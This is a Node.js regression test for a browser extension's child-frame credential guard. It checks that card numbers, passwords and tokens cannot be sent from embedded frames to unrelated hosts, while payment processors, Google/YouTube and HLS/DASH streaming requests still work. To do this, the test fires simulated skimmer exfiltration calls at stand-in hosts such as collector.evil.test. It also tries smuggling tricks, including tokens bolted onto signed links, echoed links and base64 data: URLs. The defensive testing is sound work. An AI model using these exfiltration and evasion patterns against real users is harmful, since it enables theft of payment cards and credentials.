/* WardenOne — Copyright (C) 2026 iri
   Licensed under the GNU General Public License v3 or later. See LICENSE.
   Official source: https://github.com/iri-dev/WardenOne
   Upstream filter-list attribution: CREDITS.md
   Redistributing a modified copy? GPLv3 section 5(a) requires you to mark it as changed,
   with the date, and to keep these notices intact. */
/*
 * Runtime checks for the compact child-frame credential guard.
 *
 * The test evaluates the shipped guard block, not a second implementation. A small
 * page-realm harness supplies the APIs the block wraps and records which native calls
 * still happen. This is the regression the former disclosure-only test could not give:
 * the manifest can say all_frames while the actual fetch/XHR/form paths remain native.
 *
 * Run: node tools/test-frame-credential-guard.js
 */
'use strict';

const assert = require('assert');
const fs = require('fs');
const path = require('path');
const vm = require('vm');

const ROOT = path.resolve(__dirname, '..');
const source = fs.readFileSync(path.join(ROOT, 'anti-redirect.js'), 'utf8');
const domainUtils = fs.readFileSync(path.join(ROOT, 'domain-utils.js'), 'utf8');
const start = source.indexOf('const CREDENTIAL_FRAME_VALUE_LIMIT');
const end = source.indexOf('/* CREDENTIAL_FRAME_GUARD_END */', start);
assert(start >= 0 && end > start, 'the shipped credential-frame block has stable markers');
const guardBlock = source.slice(start, end);

let checksFailed = 0;
function check(name, condition) {
  if (condition) { console.log('  ok  - ' + name); return; }
  checksFailed++;
  console.error('  FAIL - ' + name);
}

function makeField(kind, value) {
  const card = kind === 'card';
  return {
    tagName: 'INPUT',
    type: card ? 'text' : 'password',
    name: card ? 'cardnumber' : 'password',
    id: '',
    autocomplete: card ? 'cc-number' : 'current-password',
    placeholder: '',
    value,
    getAttribute() { return ''; },
  };
}

function makeHarness(options) {
  const opts = options || {};
  const state = {
    fetches: [], beacons: [], xhrSends: [], websocketSends: [], formSubmits: [], emits: [],
  };
  const listeners = Object.create(null);
  const fields = [];
  const config = {
    enabled: true,
    blockTokenExfil: true,
    detectSkimmers: true,
    paymentCardGuard: true,
  };

  class FakeStorage {
    constructor() { this.data = Object.create(null); }
    get length() { return Object.keys(this.data).length; }
    key(index) { return Object.keys(this.data)[index] || null; }
    getItem(key) { return Object.prototype.hasOwnProperty.call(this.data, key) ? this.data[key] : null; }
    setItem(key, value) { this.data[String(key)] = String(value); }
  }

  class FakeFormData {
    constructor(form) {
      this.pairs = [];
      const list = form && form.fields || [];
      for (const field of list) this.pairs.push([field.name || '', field.value || '']);
    }
    forEach(fn) { for (const [key, value] of this.pairs) fn(value, key); }
  }

  class FakeXHR {
    constructor() { this.events = []; this.listeners = []; this.readyState = 0; this.responseType = ''; }
    open(method, url) { this.nativeUrl = String(url); }
    setRequestHeader(name, value) { this.nativeHeaders = (this.nativeHeaders || []).concat([[name, value]]); }
    send(body) { state.xhrSends.push(body); this.sent = true; }
    dispatchEvent(event) { this.events.push(event && event.type); }
    /* As in the browser: the same listener added twice is registered once, and can be removed. */
    addEventListener(type, fn, capture) {
      const c = capture === true;
      if (!this.listeners.some((l) => l.type === type && l.fn === fn && l.capture === c)) this.listeners.push({ type, fn, capture: c });
    }
    removeEventListener(type, fn, capture) {
      const c = capture === true;
      this.listeners = this.listeners.filter((l) => !(l.type === type && l.fn === fn && l.capture === c));
    }
    getResponseHeader(name) { return /content-type/i.test(name) ? (this.contentType || 'text/plain') : null; }
    /* The server answers. Capturing listeners on the target run before ordinary ones and
       before the on* handler, as in the browser -- which is what lets the guard learn the
       links in a response before the page's handler asks for the next file. */
    respond(text, contentType) {
      this.readyState = 4;
      this.status = 200;
      this.responseURL = this.nativeUrl;
      this.contentType = contentType || 'text/plain';
      if (this.responseType === 'json') this.response = JSON.parse(text);
      else this.responseText = this.response = text;
      const order = this.listeners.slice().filter((l) => l.capture).concat(this.listeners.filter((l) => !l.capture));
      for (const l of order) if (l.type === 'readystatechange') l.fn.call(this, { type: 'readystatechange' });
      if (typeof this.onreadystatechange === 'function') this.onreadystatechange({ type: 'readystatechange' });
    }
  }

  class FakeResponse {
    constructor(url, body, contentType) { this.url = url; this.body = body; this.type = contentType || 'text/plain'; this.headers = { get: (n) => (/content-type/i.test(n) ? this.type : null) }; }
    text() { return Promise.resolve(this.body); }
    json() { return Promise.resolve(JSON.parse(this.body)); }
    arrayBuffer() { const b = Buffer.from(this.body, 'utf8'); return Promise.resolve(b.buffer.slice(b.byteOffset, b.byteOffset + b.byteLength)); }
    clone() { return new FakeResponse(this.url, this.body, this.type); }
  }
  const served = new Map();

  class FakeWebSocket {
    constructor(url) { this.url = url; }
    send(data) { state.websocketSends.push(data); }
  }

  class FakeForm {
    constructor(action, formFields) {
      this.action = action;
      this.fields = formFields || [];
    }
    querySelectorAll() { return this.fields; }
    submit() { state.formSubmits.push(this.action); }
  }

  const document = {
    baseURI: opts.href || 'https://checkout.example/frame',
    referrer: opts.referrer || 'https://shop.example/checkout',
    cookie: '',
    addEventListener(type, fn) { (listeners[type] = listeners[type] || []).push(fn); },
    querySelectorAll(selector) {
      return /input|textarea/.test(String(selector || '')) ? fields : [];
    },
    getElementsByTagName(tag) { return opts.media && tag === 'video' ? [{ tagName: 'VIDEO' }] : []; },
  };

  const sandbox = {
    URL, URLSearchParams, Headers, ArrayBuffer, TextDecoder, Map, Set, WeakMap,
    Object, String, Number, Date, Math, Promise, JSON, RegExp,
    encodeURIComponent, decodeURIComponent,
    btoa: (text) => Buffer.from(String(text), 'binary').toString('base64'),
    DOMException,
    Event: class Event { constructor(type) { this.type = type; } },
    ProgressEvent: class ProgressEvent { constructor(type) { this.type = type; } },
    FormData: FakeFormData,
    XMLHttpRequest: FakeXHR,
    WebSocket: FakeWebSocket,
    HTMLFormElement: FakeForm,
    Storage: FakeStorage,
    document,
    location: {
      href: opts.href || 'https://checkout.example/frame',
      hostname: 'checkout.example',
      protocol: 'https:',
      /* Real ancestorOrigins is a DOMStringList; length + index access is all the
         guard uses. Empty by default, so a harness that says nothing about its
         ancestors behaves exactly as it did before this existed. */
      ancestorOrigins: opts.ancestorOrigins || [],
    },
    navigator: {
      sendBeacon(url, data) { state.beacons.push([url, data]); return true; },
    },
    fetch(input, init) {
      state.fetches.push([input, init]);
      const url = typeof input === 'string' ? input : String(input && input.url || input);
      const reply = served.get(url);
      return Promise.resolve(reply ? new FakeResponse(reply.url || url, reply.body, reply.type) : { ok: true });
    },
    localStorage: new FakeStorage(),
    sessionStorage: new FakeStorage(),
    WO_GUARD_VERSION: '1.0.1',
    TOP_FRAME: !!opts.topFrame,
    cfg: () => config,
    hostAllowedByUser: () => false,
    regHost: (host) => String(host || '').replace(/^www\./, '').toLowerCase(),
    sameParty(a, b) {
      const clean = (host) => String(host || '').replace(/^www\./, '').toLowerCase();
      const site = (host) => clean(host).split('.').slice(-2).join('.');
      return !!(clean(a) && clean(b) && (clean(a) === clean(b) || site(a) === site(b)));
    },
    emit(type, detail) { state.emits.push({ type, detail }); },
    woOn(target, type, fn) { target.addEventListener(type, fn); },
    woTimeout(fn) { fn(); return 1; },
  };
  sandbox.window = sandbox;
  sandbox.self = sandbox;
  sandbox.top = opts.topFrame ? sandbox : {};
  sandbox.__wardenOneAntiRedirectHardener = sandbox.WO_GUARD_VERSION;

  vm.createContext(sandbox);
  vm.runInContext(domainUtils, sandbox, { filename: 'domain-utils.js' });
  vm.runInContext(guardBlock, sandbox, { filename: 'anti-redirect.js:credential-frame-guard' });

  return {
    sandbox,
    state,
    fields,
    config,
    makeForm: (action, formFields) => new sandbox.HTMLFormElement(action, formFields),
    serve(url, body, type, finalUrl) { served.set(url, { body, type, url: finalUrl }); },
    fire(type, target) {
      const event = {
        target,
        defaultPrevented: false,
        immediateStopped: false,
        preventDefault() { this.defaultPrevented = true; },
        stopImmediatePropagation() { this.immediateStopped = true; },
      };
      for (const listener of listeners[type] || []) listener(event);
      return event;
    },
  };
}

(async () => {
  const frame = makeHarness();
  const card = makeField('card', '4111 1111 1111 1111');
  const password = makeField('password', 'correct horse battery staple');
  frame.fields.push(card, password);
  frame.fire('input', card);
  frame.fire('input', password);

  await frame.sandbox.fetch('https://api.checkout.example/pay', { body: 'card=4111111111111111' });
  assert.strictEqual(frame.state.fetches.length, 1, 'same-site card requests remain native');

  await frame.sandbox.fetch('https://api.stripe.com/v1/tokens', { body: 'card=4111111111111111' });
  assert.strictEqual(frame.state.fetches.length, 2, 'known payment processors remain native');

  await assert.rejects(
    frame.sandbox.fetch('https://collector.evil.test/collect', { body: 'card=4111111111111111' }),
    /credential guard/,
    'an unrelated frame destination cannot receive an entered card',
  );
  assert.strictEqual(frame.state.fetches.length, 2, 'blocked card fetch never reaches the native API');
  assert.strictEqual(frame.state.emits.at(-1).type, 'blocked_skimmer_exfil');
  assert.strictEqual(Object.prototype.hasOwnProperty.call(frame.state.emits.at(-1).detail, 'value'), false,
    'block telemetry contains no credential value');

  const xhr = new frame.sandbox.XMLHttpRequest();
  xhr.open('POST', 'https://collector.evil.test/password');
  xhr.send('password=correct%20horse%20battery%20staple');
  assert.strictEqual(frame.state.xhrSends.length, 0, 'off-site password XHR never reaches native send');
  assert.deepStrictEqual(Array.from(xhr.events), ['readystatechange', 'error', 'loadend'],
    'blocked XHR receives a terminal network-error shape');

  const opaqueToken = 'shortOpaqueSecret123';
  frame.sandbox.localStorage.setItem('session_token', opaqueToken);
  await assert.rejects(
    frame.sandbox.fetch('https://collector.evil.test/token', { body: opaqueToken }),
    /credential guard/,
    'a later storage token is remembered even after the initial storage scan',
  );
  assert.strictEqual(frame.state.emits.at(-1).type, 'blocked_token_exfil');

  /* Google keeps the browser session, account UI and video delivery on separate
     service domains. These calls are made by child frames and legitimately carry
     opaque account/playback values. Rejecting either makes a live YouTube tab lose
     account state or playback even though reloading finds the untouched cookies. */
  const googleAccountFrame = makeHarness({
    href: 'https://accounts.google.com/gsi/iframe/select',
    ancestorOrigins: ['https://www.youtube.com'],
  });
  await googleAccountFrame.sandbox.fetch('https://www.youtube.com/youtubei/v1/account/accounts_list', {
    body: 'access_token=abcdefghijklmnopqrstuvwxyz1234567890abcd',
  });
  assert.strictEqual(googleAccountFrame.state.fetches.length, 1,
    'a Google identity frame may refresh account state back to YouTube');
  assert.strictEqual(googleAccountFrame.state.emits.length, 0,
    'the legitimate account refresh is not reported as token exfiltration');

  const youtubePlayerFrame = makeHarness({
    href: 'https://www.youtube.com/embed/example',
    ancestorOrigins: ['https://www.youtube.com'],
  });
  await youtubePlayerFrame.sandbox.fetch(
    'https://r1---sn-a5mekn6k.googlevideo.com/videoplayback?cpn=abcdefghijklmnopqrstuvwxyz1234567890abcd',
  );
  assert.strictEqual(youtubePlayerFrame.state.fetches.length, 1,
    'a YouTube child frame may send opaque playback state to Google video delivery');
  assert.strictEqual(youtubePlayerFrame.state.emits.length, 0,
    'the legitimate playback request is not reported as token exfiltration');

  const ws = new frame.sandbox.WebSocket('wss://collector.evil.test/socket');
  ws.send('password=correct horse battery staple');
  assert.strictEqual(frame.state.websocketSends.length, 0, 'off-site WebSocket credential sends are blocked');

  const form = frame.makeForm('https://collector.evil.test/form', [card]);
  frame.sandbox.HTMLFormElement.prototype.submit.call(form);
  assert.strictEqual(frame.state.formSubmits.length, 0, 'programmatic form.submit cannot bypass the guard');
  const submitEvent = frame.fire('submit', form);
  assert.strictEqual(submitEvent.defaultPrevented && submitEvent.immediateStopped, true,
    'native submit events are cancelled before page listeners can send the form');

  frame.config.blockTokenExfil = false;
  frame.config.detectSkimmers = false;
  frame.config.paymentCardGuard = false;
  await frame.sandbox.fetch('https://collector.evil.test/disabled', { body: 'card=4111111111111111' });
  assert.strictEqual(frame.state.fetches.length, 3, 'all three user toggles are honoured in child frames');

  /* A child frame is refused whatever page it sits in -- including a first-party
     frame of a site the reader trusts. There is no first-party exemption, because
     content.min.js owns the top frame (all_frames:false) and this block owns the
     children: exempting them would leave a real gap rather than close an
     inconsistency. */
  const thirdParty = makeHarness({
    href: 'https://widget.evil.test/frame',
    ancestorOrigins: ['https://discord.com'],
  });
  /* A refusal throws rather than resolving, so this has to be awaited as a rejection.
     Calling it bare made the suite die on the guard working correctly. */
  await assert.rejects(
    async () => thirdParty.sandbox.fetch('https://collector.other.test/steal', {
      body: 'token=abcdefghijklmnopqrstuvwxyz1234567890abcd',
    }),
    /Blocked by WardenOne credential guard/,
    'an embedded third party is still refused, however trusted the page around it');
  assert.strictEqual(thirdParty.state.fetches.length, 0,
    'and the request must not reach the network');

  /* Nesting changes nothing either: a frame inside another frame is still refused. */
  const nested = makeHarness({
    href: 'https://widget.evil.test/inner',
    ancestorOrigins: ['https://widget.evil.test', 'https://discord.com'],
  });
  await assert.rejects(
    async () => nested.sandbox.fetch('https://collector.other.test/steal', {
      body: 'token=abcdefghijklmnopqrstuvwxyz1234567890abcd',
    }),
    /Blocked by WardenOne credential guard/,
    'a frame nested inside its own party must not inherit the top page identity');

  /* A video site's player frame streaming from its CDN. Shape of the real failure
     (anichi.to -> megaplay.buzz player -> *.top CDN hosts): the player asks its own
     server for the sources, gets a signed master.m3u8?token=... link, and hls.js loads
     it, then the playlists it lists, with XHR. Refusing them stopped JW Player at its
     first file (error 232011). They go through because a server HANDED THEM OUT to this
     frame -- not because of what they look like. */
  const player = makeHarness({ href: 'https://player.stream.example/embed/31629', ancestorOrigins: ['https://anime.example'] });
  const X = player.sandbox.XMLHttpRequest;
  const hash = '55d46c8717ed1cb7ac23556df1745b4b/32e9d07dc186572aae7787a115f0cdbf';
  const signed = 'MTc5MDM5MDU0OXw1NWQ0NmM4NzE3ZWQxY2I3YWMyMzU1NmRmMTc0NWI0Yi8zMmU5ZDA3ZGMxODY1NzJhYWU3Nzg3YTExNWYwY2RiZg.9551dXfuZlkYU-eUnfV3Db9GvaarzQNYuJIRTnUhiBw';
  const master = 'https://fetch.cdn-example.top/anime/' + hash + '/master.m3u8?token=' + signed;
  const variant = 'https://fetch.cdn-example.top/anime/' + hash + '/index-f1-v1-a1.m3u8';
  const subs = 'https://79qle.subs-example.top/anime/' + hash + '/subtitles/eng-2.vtt';
  const seg1 = 'https://seg.cdn-example.top/anime/' + hash + '/seg-1-f1-v1-a1.jpg';
  const seg2 = 'https://fetch.cdn-example.top/anime/' + hash + '/seg-2-f1-v1-a1.html';
  const key = 'https://keys.cdn-example.top/k/' + 'k'.repeat(44);
  const inMemory = 'memOnlyAccessToken0123456789abcdefghijklmnopq';
  const get = (url) => { const x = new X(); x.open('GET', url); const before = player.state.xhrSends.length; x.send(); return { x, sent: player.state.xhrSends.length > before }; };

  check('before any server has handed it out, a signed link is refused', !get(master).sent);
  const sources = get('https://player.stream.example/stream/getSources?id=31629');
  /* PHP-style JSON, slashes escaped, as real source lists often are. */
  sources.x.respond(JSON.stringify({ sources: [{ file: master }], tracks: [{ file: subs, kind: 'captions' }] }).replace(/\//g, '\\/'), 'application/json');
  check('the guard\'s listener leaves with the finished request (a player makes thousands)',
    sources.x.listeners.filter((l) => l.type === 'readystatechange').length === 0);
  const m = get(master);
  check('once the player\'s own server has handed it out, the playlist loads', m.sent);
  m.x.respond('#EXTM3U\n#EXT-X-STREAM-INF:BANDWIDTH=800000\nindex-f1-v1-a1.m3u8\n', 'application/vnd.apple.mpegurl');
  const v = get(variant);
  check('and the playlist it lists, relative to it, with content hashes in its path', v.sent);
  /* Many CDNs sign every segment and key on its own; those can only be known from the playlist. */
  const seg3 = 'https://fetch.cdn-example.top/anime/' + hash + '/seg-3-f1-v1-a1.ts?token=' + signed;
  const signedKey = 'https://keys.cdn-example.top/k/key.bin?token=' + signed;
  v.x.respond('#EXTM3U\n#EXT-X-KEY:METHOD=AES-128,URI="' + key + '"\n#EXTINF:4,\n' + seg1 + '\n#EXTINF:4,\nseg-2-f1-v1-a1.html\n'
    + '#EXT-X-KEY:METHOD=AES-128,URI="' + signedKey + '"\n#EXTINF:4,\nseg-3-f1-v1-a1.ts?token=' + signed + '\n#EXT-X-ENDLIST\n', 'application/vnd.apple.mpegurl');
  await player.sandbox.fetch(seg1);
  await player.sandbox.fetch(seg2);
  await player.sandbox.fetch(key);
  await player.sandbox.fetch(subs);
  await player.sandbox.fetch(seg3);
  await player.sandbox.fetch(signedKey);
  check('its segments (absolute and relative, signed or not), its keys and its subtitles load', player.state.fetches.length === 6);
  check('and the only refusal recorded is the link nobody had handed out yet',
    player.state.emits.filter((e) => e.type === 'blocked_token_exfil').length === 1);

  /* A player that keeps its last source in storage makes the token look "held"; the
     handed-out link still wins, because the server sent exactly that link. */
  player.sandbox.localStorage.setItem('lastSource', master);
  check('a handed-out link still loads after the player saved it to storage', get(master).sent);

  /* DASH as Shaka reads it: fetch() + arrayBuffer(), a SegmentTemplate naming every segment. */
  player.serve('https://dash.cdn-example.net/v/manifest.mpd',
    '<?xml version="1.0"?><MPD><Period><BaseURL>https://dash.cdn-example.net/v/</BaseURL><AdaptationSet>'
    + '<SegmentTemplate media="seg-$Number%05d$.m4s?token=' + signed + '" initialization="init.mp4?token=' + signed + '"/>'
    + '</AdaptationSet></Period></MPD>', 'application/dash+xml');
  const mpd = await player.sandbox.fetch('https://dash.cdn-example.net/v/manifest.mpd');
  await mpd.arrayBuffer();
  const beforeDash = player.state.fetches.length;
  await player.sandbox.fetch('https://dash.cdn-example.net/v/seg-00012.m4s?token=' + signed);
  await player.sandbox.fetch('https://dash.cdn-example.net/v/init.mp4?token=' + signed);
  check('a DASH template\'s segments and init load', player.state.fetches.length === beforeDash + 2);

  /* A source list read with fetch() + json(). */
  const other = 'https://cdn2.example.org/live/' + hash + '/playlist.m3u8?auth=' + signed;
  player.serve('https://player.stream.example/api/sources2', JSON.stringify({ hls: other }), 'application/json');
  await (await player.sandbox.fetch('https://player.stream.example/api/sources2')).json();
  const beforeJson = player.state.fetches.length;
  await player.sandbox.fetch(other);
  check('a link read out of fetch().json() loads too', player.state.fetches.length === beforeJson + 1);

  /* What is still refused -- including the two gaps the looser media rule left open. */
  const refused = async (url, label, init) => {
    const before = player.state.fetches.length;
    let rejected = false;
    try { await player.sandbox.fetch(url, init); } catch (e) { rejected = /credential guard/.test(String(e && e.message)); }
    check(label, rejected && player.state.fetches.length === before);
  };
  await refused('https://collector.evil.test/pixel/' + inMemory, 'a token held only in memory, in an innocent-looking path');
  await refused('https://collector.evil.test/p?d=' + inMemory, 'or under an innocent-looking parameter name');
  await refused('https://collector.evil.test/live.m3u8?x=' + inMemory, 'or dressed up as a playlist');
  await refused(master.replace(signed, 'Z' + signed.slice(1)), 'the handed-out path with a token it was not handed');
  await refused(master + '&x=' + inMemory, 'a value bolted onto a handed-out link');
  await refused('https://dash.cdn-example.net/v/seg-00012.m4s?token=' + signed + '&x=' + inMemory, 'or onto a DASH template');
  await refused('https://collector.evil.test/pixel?token=' + signed, 'a token parameter to an unrelated URL');
  await refused('https://collector.evil.test/x/eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abcdefghijklmnop', 'a JWT anywhere in a URL');
  await refused('https://collector.evil.test/playlist.m3u8', 'a token in a body, whatever the URL', { method: 'POST', body: 'token=' + signed });

  /* A same-site endpoint that echoes what it was sent does not hand anything out. */
  const laundered = 'https://collector.evil.test/c?token=' + inMemory;
  const echo = get('https://player.stream.example/api/echo?u=' + encodeURIComponent(laundered));
  echo.x.respond('{"u":"' + laundered + '"}', 'application/json');
  await refused(laundered, 'a link a same-site endpoint merely echoed back is not "handed out"');
  /* Nor does a data: or blob: "response": that is the script talking to itself. */
  const smuggled = 'https://collector.evil.test/d?token=' + inMemory;
  const dataUrl = 'data:text/plain,' + smuggled;
  player.serve(dataUrl, smuggled, 'text/plain', dataUrl);
  await (await player.sandbox.fetch(dataUrl)).text();
  await refused(smuggled, 'a link from a data: URL is not "handed out"');
  /* ...even when the token is not visible in the data: URL itself (base64), so the echo
     rule above cannot be what catches it. */
  const smuggledB64 = 'https://collector.evil.test/b?token=' + inMemory + 'B';
  const dataB64 = 'data:text/plain;base64,' + Buffer.from(smuggledB64).toString('base64');
  player.serve(dataB64, smuggledB64, 'text/plain', dataB64);
  await (await player.sandbox.fetch(dataB64)).text();
  await refused(smuggledB64, 'nor one decoded out of a base64 data: URL');

  const stored = 'sessAbcdefghijklmnopqrstu0123456789';
  player.sandbox.localStorage.setItem('session', stored);
  await refused(master + '&d=' + stored, 'a stored credential bolted onto a handed-out link');

  /* IDs in a path are not tokens; secrets in a path still are. The second server on the
     reported page runs a reachability check on a CDN link with a hex ID in its path before
     it will play, and refusing that made the player abandon the server. */
  const beforeIds = player.state.fetches.length;
  /* (Fresh IDs: the player above saved its source link to storage, and a frame remembers what
     is stored -- those exact IDs are now "held", as they always would have been.) */
  await player.sandbox.fetch('https://api.cdn-other.example/v/9f86d081884c7d659a2feaa0c55ad015/a3bf4f1b2b0b822cd15d6c15b0f00a08/thumb.jpg');
  await player.sandbox.fetch('https://p16-cdn.example.com/site-i18n/202607165d0d20b2a3191de94ec5b97c~tplv-d5opwmad15-origin.image?lk3s=6d71dd51&x-expires=1815698192&x-signature=PvGUdKz9PvHQ5l2MopK6Ogzz2Z8%3D');
  check('content IDs (hex) in a URL path are not a token, handed out or not', player.state.fetches.length === beforeIds + 2);
  await refused('https://collector.evil.test/q?id=' + 'a1b2c3d4e5f6a7b8c9d0a1b2c3d4e5f6a7b8', 'but a long hex value in the query still counts');
  await refused('https://collector.evil.test/' + 'AbCdEfGh0123456789IjKlMnOp9876543210QrStUv', 'and a secret-looking run in the path does too');

  /* The encrypted-source exception: only the first PLAYLIST, only from a page showing media. */
  const playing = makeHarness({ href: 'https://player.stream.example/embed/7', ancestorOrigins: ['https://anime.example'], media: true });
  const encrypted = 'https://cdn.enc-example.top/v/' + hash + '/master.m3u8?token=' + signed;
  const pl = new playing.sandbox.XMLHttpRequest();
  pl.open('GET', encrypted);
  pl.send();
  check('a playing page may load a playlist it decrypted itself (no response ever held the link)', playing.state.xhrSends.length === 1);
  const pr = async (url, label, init) => {
    const before = playing.state.fetches.length;
    let rejected = false;
    try { await playing.sandbox.fetch(url, init); } catch (e) { rejected = /credential guard/.test(String(e && e.message)); }
    check(label, rejected && playing.state.fetches.length === before);
  };
  await pr('https://cdn.enc-example.top/v/seg-1.ts?token=' + signed, 'but not a segment -- that must have been listed in the playlist');
  await pr('https://cdn.enc-example.top/v/subs.vtt?token=' + signed, 'nor subtitles');
  await pr(encrypted, 'nor a playlist request that sends a body', { method: 'POST', body: 'x=1' });
  playing.sandbox.localStorage.setItem('session_token', stored);
  await pr('https://cdn.enc-example.top/v/live.m3u8?token=' + stored, 'nor a playlist carrying a credential the frame holds');
  check('and a page with no video or audio gets no such exception', !get(encrypted.replace('/v/', '/w/')).sent);
  const pw = makeField('password', 'correct horse battery staple');
  player.fields.push(pw);
  player.fire('input', pw);
  await refused('https://collector.evil.test/v.m3u8?p=' + encodeURIComponent('correct horse battery staple'), 'an entered password');
  if (checksFailed) throw new Error(checksFailed + ' player check(s) failed');

  const top = makeHarness({ topFrame: true });
  const nativeTopFetch = top.sandbox.fetch;
  await top.sandbox.fetch('https://collector.evil.test/top', { body: 'access_token=abcdefghijklmnopqrstuvwxyz123456' });
  assert.strictEqual(top.sandbox.fetch, nativeTopFetch, 'the compact layer does not stack over the top-frame engine');
  assert.strictEqual(top.state.fetches.length, 1, 'top-frame requests remain owned by content.min.js');

  console.log('[ok] child-frame credential guard blocks fetch/XHR/WebSocket/forms and preserves trusted/top-frame paths');
})().catch((error) => {
  console.error(error && error.stack || error);
  process.exit(1);
});
